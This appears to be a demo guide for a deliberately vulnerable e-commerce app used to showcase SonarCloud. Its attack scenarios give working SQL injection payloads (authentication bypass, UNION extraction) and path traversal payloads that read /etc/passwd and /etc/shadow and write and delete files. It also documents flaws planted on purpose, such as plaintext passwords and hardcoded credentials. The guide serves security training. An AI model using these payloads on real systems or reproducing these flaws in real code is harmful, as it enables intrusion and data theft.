# SonarShowcase Business Logic & Demo Guide

> **Purpose**: This document describes the functional business domain of SonarShowcase and provides guidance for demonstrating both the application flow and SonarCloud analysis capabilities.

---

## Table of Contents

1. [Business Domain Overview](#business-domain-overview)
2. [Core Entities](#core-entities)
3. [Business Flows](#business-flows)
4. [API Reference](#api-reference)
5. [Demo Scenarios](#demo-scenarios)
6. [SonarCloud Issues by Feature](#sonarcloud-issues-by-feature)

---

## Business Domain Overview

SonarShowcase simulates a **basic e-commerce platform** with the following capabilities:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        E-Commerce Platform                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   ┌──────────┐      ┌──────────┐      ┌──────────┐      ┌──────────┐   │
│   │   User   │      │ Product  │      │  Order   │      │ Payment  │   │
│   │Management│ ───► │ Catalog  │ ───► │Processing│ ───► │  Gateway │   │
│   └──────────┘      └──────────┘      └──────────┘      └──────────┘   │
│                                                                          │
│   • Registration    • Browse items   • Cart checkout  • Card validation │
│   • Authentication  • Categories     • Discounts      • Stripe/PayPal   │
│   • Profile mgmt    • Inventory      • Shipping       • Refunds         │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Key Business Capabilities

| Capability | Description | Status |
|------------|-------------|--------|
| User Registration | Create and manage customer accounts | ✅ Functional |
| User Authentication | Login with username/password | ⚠️ Insecure (intentional) |
| Product Catalog | Browse available products | 🔧 Partial |
| Order Management | Create and track orders | ✅ Functional |
| Discount System | Apply promotional codes | ✅ Functional |
| Payment Processing | Process card payments | 🔧 Mock implementation |
| Email Notifications | Send order confirmations | 🔧 Mock implementation |

---

## Core Entities

### User

Represents customers and administrators in the system.

```
┌─────────────────────────────────────┐
│              User                   │
├─────────────────────────────────────┤
│ id: Long                            │
│ username: String                    │
│ email: String                       │
│ password: String (plain text!)      │
│ creditCardNumber: String            │
│ ssn: String                         │
│ role: String (USER | ADMIN)         │
│ active: Boolean                     │
│ createdAt: Date                     │
│ updatedAt: Date                     │
├─────────────────────────────────────┤
│ orders: List<Order>                 │
└─────────────────────────────────────┘
```

**Pre-seeded Users** (created on startup):

| Username | Email | Password | Role |
|----------|-------|----------|------|
| admin | admin@sonarshowcase.com | admin123 | ADMIN |
| john.doe | john@example.com | password123 | USER |
| jane.smith | jane@example.com | password123 | USER |
| bob.wilson | bob@example.com | password123 | USER (inactive) |

### Product

Represents items available for purchase.

```
┌─────────────────────────────────────┐
│            Product                  │
├─────────────────────────────────────┤
│ id: Long                            │
│ name: String                        │
│ description: String                 │
│ price: BigDecimal                   │
│ quantity: Integer                   │
│ category: String                    │
│ sku: String                         │
│ available: Boolean                  │
└─────────────────────────────────────┘
```

### Order

Represents a customer purchase transaction.

```
┌─────────────────────────────────────┐
│              Order                  │
├─────────────────────────────────────┤
│ id: Long                            │
│ orderNumber: String (auto-generated)│
│ totalAmount: BigDecimal             │
│ status: String                      │
│ orderDate: Date                     │
│ shippingAddress: String             │
│ notes: String                       │
├─────────────────────────────────────┤
│ user: User                          │
│ products: List<Product>             │
└─────────────────────────────────────┘
```

**Order Status Lifecycle**:

```
PENDING ──► PROCESSING ──► SHIPPED ──► DELIVERED
                │
                └──► CANCELLED
```

---

## Business Flows

### Flow 1: User Registration & Management

```
┌─────────┐     ┌─────────────┐     ┌──────────────┐     ┌─────────────┐
│ Client  │────►│ POST /users │────►│ UserService  │────►│ Database    │
│         │     │             │     │ .createUser()│     │ (PostgreSQL)│
└─────────┘     └─────────────┘     └──────────────┘     └─────────────┘
```

**Business Rules**:
- Username must be unique
- Email must be valid format
- Password stored in plain text (⚠️ intentional security issue)
- New users default to `USER` role and `active = true`

### Flow 2: Order Creation

```
┌──────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  Client  │────►│ POST /orders │────►│ OrderService │────►│   Database   │
│          │     │              │     │              │     │              │
└──────────┘     └──────────────┘     └──────────────┘     └──────────────┘
                                              │
                                              ▼
                                     ┌──────────────────┐
                                     │ Generate order # │
                                     │ Set status=PENDING│
                                     │ Set orderDate    │
                                     └──────────────────┘
```

**Order Number Format**: `ORD-{timestamp}-{uuid8}`  
Example: `ORD-1703001234567-a1b2c3d4`

### Flow 3: Order Pricing Calculation

The system calculates order totals with the following rules:

```
┌─────────────────────────────────────────────────────────────┐
│                    PRICING RULES                             │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Subtotal                                                    │
│     │                                                        │
│     ├──► If subtotal > $100 ──► Apply 10% discount          │
│     │                                                        │
│     ▼                                                        │
│  + Tax (8.25%)                                               │
│     │                                                        │
│     ▼                                                        │
│  + Shipping                                                  │
│     │                                                        │
│     ├──► If subtotal > $50 ──► FREE shipping                │
│     └──► Otherwise ──► $5.99 flat rate                      │
│                                                              │
│  = TOTAL                                                     │
└─────────────────────────────────────────────────────────────┘
```

### Flow 4: Discount Code Application

```
POST /api/v1/orders/{id}/discount?code=XXXX
```

**Available Discount Codes**:

| Code | Discount | Description |
|------|----------|-------------|
| `SUMMER2023` | 15% | Seasonal promotion |
| `VIP` | 25% | VIP customer discount |
| `EMPLOYEE` | 50% | Employee discount |

### Flow 5: Payment Processing

```
┌──────────┐     ┌───────────────┐     ┌─────────────────┐
│  Client  │────►│PaymentService │────►│ Stripe API      │
│          │     │.processPayment│     │ (mock/insecure) │
└──────────┘     └───────────────┘     └─────────────────┘
                        │
                        ▼
               ┌─────────────────┐
               │ Validate card   │
               │ Log transaction │
               │ Return result   │
               └─────────────────┘
```

**Payment Rules**:
- Minimum payment amount: $0.50
- Card number must be at least 13 digits
- CVV required for validation

---

## API Reference

### Users API

| Method | Endpoint | Description | Request Body |
|--------|----------|-------------|--------------|
| GET | `/api/v1/users` | List all users | - |
| GET | `/api/v1/users/{id}` | Get user by ID | - |
| GET | `/api/v1/users/search?q={query}` | Search users (in-memory search) | - |
| POST | `/api/v1/users` | Create new user | `{username, email, password, role?}` |
| PUT | `/api/v1/users/{id}/password?oldPassword={old}&newPassword={new}` | Update password (⚠️ insecure) | - |
| DELETE | `/api/v1/users/{id}` | Delete user | - |

### Orders API

| Method | Endpoint | Description | Request Body |
|--------|----------|-------------|--------------|
| GET | `/api/v1/orders` | List all orders | - |
| GET | `/api/v1/orders/{id}` | Get order by ID | - |
| GET | `/api/v1/orders/user/{userId}` | Get orders by user | - |
| POST | `/api/v1/orders` | Create new order | `{user: {id}, totalAmount, ...}` |
| POST | `/api/v1/orders/{id}/discount` | Apply discount code | `?code=XXXX` |

### Health API

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/v1/health` | System health check |
| GET | `/api/v1/info` | System information (⚠️ exposes sensitive data) |

---

## Demo Scenarios

### Scenario 1: Complete Customer Journey

**Objective**: Demonstrate a full e-commerce flow from registration to order.

```bash
# Step 1: Check system health
curl http://localhost:8080/api/v1/health

# Step 2: View existing users
curl http://localhost:8080/api/v1/users

# Step 3: Create a new customer
curl -X POST http://localhost:8080/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "demo_customer",
    "email": "demo@example.com",
    "password": "demo123"
  }'

# Step 4: Create an order for the customer
curl -X POST http://localhost:8080/api/v1/orders \
  -H "Content-Type: application/json" \
  -d '{
    "user": {"id": 5},
    "totalAmount": 75.00,
    "shippingAddress": "123 Demo Street"
  }'

# Step 5: Apply a discount code
curl -X POST "http://localhost:8080/api/v1/orders/1/discount?code=SUMMER2023"

# Step 6: View the order
curl http://localhost:8080/api/v1/orders/1
```

### Scenario 2: Frontend Dashboard Demo

**Objective**: Show the React frontend interacting with the API.

1. Open browser to `http://localhost:8080`
2. Observe the Dashboard loading user data
3. Click on users to see selection behavior
4. Open browser DevTools → Console to see the intentional console.log spam
5. Open Network tab to see API calls

### Scenario 3: Admin Operations

**Objective**: Demonstrate administrative capabilities.

```bash
# View all orders in the system
curl http://localhost:8080/api/v1/orders

# Delete a user (cascades to orders)
curl -X DELETE http://localhost:8080/api/v1/users/3

# Verify deletion
curl http://localhost:8080/api/v1/users
```

### Scenario 4: SQL Injection Attack Demo

**Objective**: Demonstrate SQL Injection vulnerabilities for security training.

> ⚠️ **WARNING**: These are intentional security vulnerabilities for educational purposes only.

```bash
# Attack 1: Authentication Bypass via SQL Injection
# The '--' comments out the password check, allowing login as any user
curl "http://localhost:8080/api/v1/users/login?username=admin'--&password=anything"

# Attack 2: Login as first user in database using OR injection
curl "http://localhost:8080/api/v1/users/login?username=' OR '1'='1'--&password=x"

# Attack 3: UNION-based injection to extract all users
curl "http://localhost:8080/api/v1/users/vulnerable-search?term=' UNION SELECT * FROM users--"

# Attack 4: ORDER BY injection (can be used for blind SQL injection)
curl "http://localhost:8080/api/v1/users/sorted?orderBy=username"

# Attack 5: ORDER BY with malicious payload
curl "http://localhost:8080/api/v1/users/sorted?orderBy=(SELECT CASE WHEN (1=1) THEN username ELSE email END)"
```

**What SonarCloud Detects**:
- Rule S3649: SQL Injection - User-controlled data used in SQL query
- SQL queries constructed using string concatenation
- Native queries with unsanitized user input

### Scenario 5: Path Traversal Attack Demo

**Objective**: Demonstrate Path Traversal vulnerabilities for security training.

> ⚠️ **WARNING**: These are intentional security vulnerabilities for educational purposes only.

```bash
# Attack 1: Read /etc/passwd via download endpoint
curl "http://localhost:8080/api/v1/files/download?filename=../../../etc/passwd"

# Attack 2: Read arbitrary file via read endpoint
curl "http://localhost:8080/api/v1/files/read?path=/etc/passwd"

# Attack 3: Profile endpoint path traversal
curl "http://localhost:8080/api/v1/files/profile?username=../../../etc/passwd"

# Attack 4: Log endpoint with date injection
curl "http://localhost:8080/api/v1/files/logs?date=2025-01-01/../../../../etc/shadow"

# Attack 5: Template inclusion attack
curl "http://localhost:8080/api/v1/files/template?name=../../../../etc/passwd"

# Attack 6: Write arbitrary file (dangerous!)
curl -X POST "http://localhost:8080/api/v1/files/export?filename=../../../tmp/pwned.txt" \
  -H "Content-Type: text/plain" \
  -d "This file was created via path traversal"

# Attack 7: Delete arbitrary file (dangerous!)
curl -X DELETE "http://localhost:8080/api/v1/files/delete?filename=../../../tmp/important.txt"
```

**What SonarCloud Detects**:
- Rule S2083: Path Traversal - User-controlled data in file path
- Rule S4797: Filesystem access without proper validation
- File operations using unvalidated user input

---

## SonarCloud Issues by Feature

This section maps intentional code quality issues to their business features, useful for demonstrating SonarCloud analysis results.

### User Management Issues

| Location | Issue Type | Description |
|----------|------------|-------------|
| `UserRepository` | 🔴 Security | SQL Injection vulnerability in custom queries |
| `UserController` | 🔴 Security | SQL Injection in login, search, and sorted endpoints |
| `User.java` | 🔴 Security | Plain text password storage, exposed SSN/credit card |
| `UserService` | 🟡 Reliability | Null pointer risks on user lookup |
| `UserController` | 🟢 Maintainability | Missing input validation |

### Order Processing Issues

| Location | Issue Type | Description |
|----------|------------|-------------|
| `OrderService` | 🟡 Reliability | NPE from Optional.get() without check |
| `OrderService` | 🟢 Maintainability | Magic numbers (tax rate, shipping, discounts) |
| `OrderController` | 🟢 Maintainability | Hardcoded discount codes as magic strings |
| `Order.java` | 🟢 Maintainability | Status should be enum, not String |

### Payment Processing Issues

| Location | Issue Type | Description |
|----------|------------|-------------|
| `PaymentService` | 🔴 Security | Hardcoded Stripe/PayPal/AWS credentials |
| `PaymentService` | 🔴 Security | Logging sensitive card data (PCI violation) |
| `PaymentService` | 🔴 Security | HTTP instead of HTTPS for API calls |
| `PaymentService` | 🟡 Reliability | Unclosed HTTP connections, swallowed exceptions |

### File Operations Issues

| Location | Issue Type | Description |
|----------|------------|-------------|
| `FileController` | 🔴 Security | Path Traversal in download endpoint |
| `FileController` | 🔴 Security | Path Traversal in read endpoint |
| `FileController` | 🔴 Security | Path Traversal in profile endpoint |
| `FileController` | 🔴 Security | Path Traversal in logs endpoint |
| `FileController` | 🔴 Security | Path Traversal in export (write) endpoint |
| `FileController` | 🔴 Security | Path Traversal in template endpoint |
| `FileController` | 🟡 Reliability | Resource leaks (unclosed file readers) |
| `FileController` | 🟡 Reliability | Stack trace exposure in error responses |

### Frontend Issues

| Location | Issue Type | Description |
|----------|------------|-------------|
| `App.tsx` | 🟢 Maintainability | Excessive use of `any` type |
| `Dashboard.tsx` | 🟡 Reliability | Incomplete useEffect dependency arrays |
| `CommentDisplay.tsx` | 🔴 Security | XSS via `dangerouslySetInnerHTML` |
| `api.ts` | 🔴 Security | JWT stored in localStorage |

---

## Appendix: Running the Demo

### Prerequisites

- Docker & Docker Compose
- curl (for API demos)
- Modern web browser (for frontend demos)

### Quick Start

```bash
# Start the full stack
docker-compose up -d

# Wait for startup (1-2 minutes)
# Application available at: http://localhost:8080

# Run SonarCloud analysis
export SONAR_TOKEN=your_token_here
mvn clean verify sonar:sonar
```

### Verifying the Setup

```bash
# Check backend health
curl http://localhost:8080/api/v1/health
# Expected: {"status":"UP","timestamp":"..."}

# Check users are seeded
curl http://localhost:8080/api/v1/users
# Expected: Array with 4 users (admin, john.doe, jane.smith, bob.wilson)
```

---

## Document History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | January 2025 | AI Assistant | Initial documentation |

---

*This documentation is part of the SonarShowcase demonstration project.*

